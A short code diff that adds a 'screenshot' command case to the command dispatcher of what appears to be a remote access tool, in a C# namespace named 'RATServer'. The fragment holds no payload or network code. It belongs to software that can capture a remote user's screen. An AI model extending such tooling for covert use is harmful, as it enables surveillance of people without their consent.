@@ -96,6 +96,9 @@ namespace RATServer
                         case "software":
                             r = Functions.Software();
                             break;
+                        case "screenshot":
+                            r = Functions.ScreenShot();
+                            break;
                         default:
                             break;
                     }                 
